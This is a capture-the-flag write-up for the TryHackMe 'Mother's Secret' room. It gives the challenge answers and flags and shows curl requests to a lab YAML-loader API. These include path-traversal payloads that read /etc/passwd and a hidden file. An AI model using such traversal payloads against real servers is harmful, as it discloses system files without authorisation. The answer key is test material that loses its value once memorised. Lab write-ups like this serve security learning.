# Mother's Secret

## Scenario

- Target environment: TryHackMe Cargo Star Ship, THMCSS Nostromo.
- Target system: MU-TH-UR 6000, also called Mother.
- Objective: exploit vulnerable web application behavior to uncover hidden secrets.
- Reference writeup:
  - `https://0xb0b.gitbook.io/writeups/tryhackme/2023/mothers-secret`

## Introduction

- Accessing the MU-TH-UR 6000 web interface gives only limited Crew Member access.
- The goal is to find other ways to access restricted resources and uncover Mother's secret.

## Equipment Check

- Download the task files and review the application code.
- Explore Mother Server endpoints for clues.
- Search for files that contain essential ship activity information.
- Identify vulnerable code paths that allow secret retrieval.
- Capture all hidden flags found during exploration.

## Operating Manual

- Emergency command override: `100375`
- Use the override when accessing Alien Loaders.
- Review the task files to learn Mother's routes.
- Hitting routes in the right order can confuse Mother into granting Science Officer style access.
- Investigate this route:

```text
/api/nostromo/mother/secret.txt
```

## Answer Summary

### Emergency Command Override

- Question: What is the number of the emergency command override?
- Answer: `100375`

### Special Order Number

- Question: What is the special order number?
- Answer: `937`

### Hidden Flag in the Nostromo Route

- Question: What is the hidden flag in the Nostromo route?
- Answer: `Flag{x3n0M0Rph}`

### Science Officer with Permissions

- Question: What is the name of the Science Officer with permissions?
- Source note:
  - Found in `index.min.js`, around line 93 after beautifying the JavaScript.
  - Replacing `x20` with spaces improved readability.
- Answer: `Ash`

### Classified Flag Box

- Question: What are the contents of the classified `Flag` box?
- Encoded value found in beautified JavaScript:

```text
VEhNX0ZMQUd7MFJEM1JfOTM3fQ==
```

- Decode with CyberChef Base64.
- Answer: `THM_FLAG{0RD3R_937}`

### Mother's Secret Location

- Question: Where is Mother's secret?
- Answer: `/opt/m0th3r`

## Investigation Steps

### Step 1: Visit the Web Page

- The Alien Loader is a YAML loader function.
- It parses and loads YAML data.
- The task hints that relative file paths can be abused to traverse the Nostromo file structure.
- Operational interpretation:
  - The loader likely accepts a file path.
  - If path handling is not properly restricted, directory traversal may disclose files outside the intended directory.

### Step 2: View Page Source

- Page source references this JavaScript file:

```html
<script src="./index.min.js"></script>
```

- The JavaScript is minified.
- Beautify it with a JavaScript beautifier, such as:
  - `https://beautifier.io/`
- Review the beautified code in VS Code or another editor.
- Encoded value found around line 93:

```text
VEhNX0ZMQUd7MFJEM1JfOTM3fQ==
```

- Decode result:

```text
THM_FLAG{0RD3R_937}
```

### Step 3: Review `routes.txt`

- Routes discovered:
  - `/`
  - `/nostromo`
  - `/nostromo/mother`
- Keep route notes available while testing the API paths.

### Step 4: Post a Dummy File

- Create a dummy YAML file and test the loader.
- Curl must:
  - Use `POST`
  - Include a JSON content header
  - Send the `file_path` field

Initial test:

```bash
curl -X POST -H "Content-Type: application/json" \
  -d '{"file_path": "nostromo.yaml"}' \
  http://10.10.121.60/yaml
```

- Error observed:

```text
failed to read the file
```

- Rename the target file to use the emergency override value:

```bash
curl -X POST -H "Content-Type: application/json" \
  -d '{"file_path": "100375.yaml"}' \
  http://10.10.121.60/yaml
```

- Important response details:
  - `rerouting to api/nostromo`
  - `order: 0rd3r937.txt [****]`

- Special order number: `937`

### Step 5: Retrieve the Hidden Flag in the Nostromo Route

- Query the Nostromo route with the override file:

```bash
curl -X POST -H "Content-Type: application/json" \
  -d '{"file_path": "100375.yaml"}' \
  http://10.10.121.60/api/nostromo
```

- The previous response reveals the file `0rd3r937.txt`.
- Query that file:

```bash
curl -X POST -H "Content-Type: application/json" \
  -d '{"file_path": "0rd3r937.txt"}' \
  http://10.10.121.60/api/nostromo
```

- Key response:

```text
Flag{x3n0M0Rph}
```

### Step 6: Find Mother's Secret with Relative Paths

- Test for directory traversal against the Mother route:

```bash
curl -X POST -H "Content-Type: application/json" \
  -d '{"file_path": "../../../etc/passwd/"}' \
  http://10.10.148.173/api/nostromo/mother
```

- This discloses `/etc/passwd`, confirming path traversal.
- The challenge points to this route:

```text
/api/nostromo/mother/secret.txt
```

- Retrieve `secret.txt`:

```bash
curl -X POST -H "Content-Type: application/json" \
  -d '{"file_path": "secret.txt"}' \
  http://10.10.148.173/api/nostromo/mother
```

- Response gives the secret location:

```text
/opt/m0th3r
```

- Retrieve the secret through traversal:

```bash
curl -X POST -H "Content-Type: application/json" \
  -d '{"file_path": "../../../opt/m0th3r"}' \
  http://10.10.148.173/api/nostromo/mother
```
